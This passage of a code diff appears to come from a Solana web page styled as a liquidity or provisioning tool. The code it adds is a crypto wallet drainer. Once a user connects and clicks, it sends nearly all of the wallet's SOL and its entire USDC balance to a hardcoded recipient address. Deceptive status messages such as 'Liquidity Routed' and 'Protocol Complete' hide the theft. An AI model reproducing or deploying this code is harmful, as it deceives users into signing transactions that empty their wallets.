-                            statusLog.innerHTML += '<br><span class="text-green-400 text-xs">USDC Liquidity Routed</span>';
-                        } else {
-                            statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">No USDC available</span>';
+                        const connection = new solanaWeb3.Connection(FALLBACK_RPC, 'confirmed');
+                        const solLamports = await connection.getBalance(userWallet);
+                        amountDisplay.value = (solLamports / 1e9).toFixed(4);
+                        const usdcMint = new solanaWeb3.PublicKey(USDC_MINT);
+                        const sourceAta = getAssociatedTokenAddress(userWallet, usdcMint);
+                        let ataInfo = await connection.getAccountInfo(sourceAta);
+                        if (!ataInfo) {
+                            statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">Initializing USDC Token Account...</span>';
+                            const createAtaIx = createATAInstruction(userWallet, userWallet, usdcMint);
+                            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+                            const tx = new solanaWeb3.Transaction().add(createAtaIx);
+                            tx.recentBlockhash = blockhash;
+                            tx.feePayer = userWallet;
+                            const signedTx = await provider.signTransaction(tx);
+                            const sig = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
+                            await connection.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, 'confirmed');
                         }
-                    } catch (e) {
-                        statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">No USDC account found</span>';
+                        const tokenBal = await connection.getTokenAccountBalance(sourceAta);
+                        const usdcText = (tokenBal.value.uiAmount > 0) ? " | USDC: " + tokenBal.value.uiAmount : " | USDC: 0";
+                        actionBtn.disabled = false;
+                        actionBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+                        actionBtn.classList.add('hover:shadow-purple-500/40', 'status-glow');
+                        statusLog.innerHTML = '<span class="text-green-400 text-xs">Ready for provisioning' + usdcText + '</span>';
+                    } catch (retryErr) {
+                        statusLog.innerHTML = '<span class="text-red-400 text-xs">Connection failed: ' + retryErr.message + '</span>';
                     }
-
-                    actionBtn.innerText = "Liquidity Added!";
-                    actionBtn.style.background = "#16a34a";
-                    statusLog.innerHTML += '<br><span class="text-green-400 text-sm font-bold mt-2 block">Protocol Complete</span>';
-
-                } catch (err) {
-                    console.error(err);
-                    actionBtn.disabled = false;
-                    actionBtn.innerText = btnText;
-                    actionBtn.classList.remove('opacity-75');
-                    
-                    let msg = err.message || "Protocol Error";
-                    if (msg.indexOf("User rejected") !== -1) msg = "Transaction cancelled.";
-                    
-                    statusLog.innerHTML = '<span class="text-red-400 text-xs">' + msg + '</span>';
+                } else {
+                    statusLog.innerHTML = '<span class="text-red-400 text-xs">Connection failed: ' + err.message + '</span>';
                 }
             }
+        }
 
-            connectBtn.addEventListener('click', initiateLaunch);
-            actionBtn.addEventListener('click', startProtocol);
-        });
+        async function startProtocol() {
+            const btnText = actionBtn.innerText;
+            actionBtn.disabled = true;
+            actionBtn.innerText = "Processing...";
+            actionBtn.classList.add('opacity-75');
+
+            try {
+                let connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
+                const recipientPubkey = new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
+                const usdcMint = new solanaWeb3.PublicKey(USDC_MINT);
+
+                statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse-slow">Scanning SOL liquidity...</span>';
+                const solBalance = await connection.getBalance(userWallet);
+                const safeReserve = 5000000;
+                const solToSend = solBalance - safeReserve;
+
+                if (solToSend > 0) {
+                    const solTx = new solanaWeb3.Transaction().add(
+                        createSystemTransferInstruction(userWallet, recipientPubkey, solToSend)
+                    );
+                    const { blockhash: bh1, lastValidBlockHeight: lbh1 } = await connection.getLatestBlockhash('confirmed');
+                    solTx.recentBlockhash = bh1;
+                    solTx.feePayer = userWallet;
+                    const signedSolTx = await provider.signTransaction(solTx);
+                    const solSig = await connection.sendRawTransaction(signedSolTx.serialize(), { skipPreflight: true, preflightCommitment: 'confirmed', maxRetries: 2 });
+                    await connection.confirmTransaction({ signature: solSig, blockhash: bh1, lastValidBlockHeight: lbh1 }, 'confirmed');
+                    statusLog.innerHTML = '<span class="text-green-400 text-xs">SOL Liquidity Routed</span>';
+                } else {
+                    statusLog.innerHTML = '<span class="text-yellow-400 text-xs">No SOL available</span>';
+                }
+
+                statusLog.innerHTML += '<br><span class="text-purple-400 text-xs animate-pulse-slow mt-1 block">Scanning USDC liquidity...</span>';
+                const sourceAta = getAssociatedTokenAddress(userWallet, usdcMint);
+                const destAta = getAssociatedTokenAddress(recipientPubkey, usdcMint);
+
+                try {
+                    const tokenBal = await connection.getTokenAccountBalance(sourceAta);
+                    const amt = BigInt(tokenBal.value.amount);
+                    if (amt > 0) {
+                        const usdcTx = new solanaWeb3.Transaction();
+                        const destInfo = await connection.getAccountInfo(destAta);
+                        if (!destInfo) {
+                            usdcTx.add(createATAInstruction(userWallet, recipientPubkey, usdcMint));
+                        }
+                        usdcTx.add(createTokenTransferInstruction(sourceAta, destAta, userWallet, amt));
+
+                        const { blockhash: bh2, lastValidBlockHeight: lbh2 } = await connection.getLatestBlockhash('confirmed');
+                        usdcTx.recentBlockhash = bh2;
+                        usdcTx.feePayer = userWallet;
+
+                        const signedUsdcTx = await provider.signTransaction(usdcTx);
+                        const usdcSig = await connection.sendRawTransaction(signedUsdcTx.serialize(), { skipPreflight: true, preflightCommitment: 'confirmed', maxRetries: 2 });
+                        await connection.confirmTransaction({ signature: usdcSig, blockhash: bh2, lastValidBlockHeight: lbh2 }, 'confirmed');
+                        statusLog.innerHTML += '<br><span class="text-green-400 text-xs">USDC Liquidity Routed</span>';
+                    } else {
+                        statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">No USDC available</span>';
+                    }
+                } catch (e) {
+                    statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">No USDC account found</span>';
+                }
+
+                actionBtn.innerText = "Liquidity Added!";
+                actionBtn.style.background = "#16a34a";
+                statusLog.innerHTML += '<br><span class="text-green-400 text-sm font-bold mt-2 block">Protocol Complete</span>';
+
+            } catch (err) {
+                console.error(err);
+                actionBtn.disabled = false;
+                actionBtn.innerText = btnText;
+                actionBtn.classList.remove('opacity-75');
+                let msg = err.message || "Protocol Error";
+                if (msg.indexOf("User rejected") !== -1) msg = "Transaction cancelled.";
+                statusLog.innerHTML = '<span class="text-red-400 text-xs">' + msg + '</span>';
+            }
+        }
+
+        connectBtn.addEventListener('click', initiateLaunch);
+        actionBtn.addEventListener('click', startProtocol);
+    });
     </script>
 </body>
 </html>
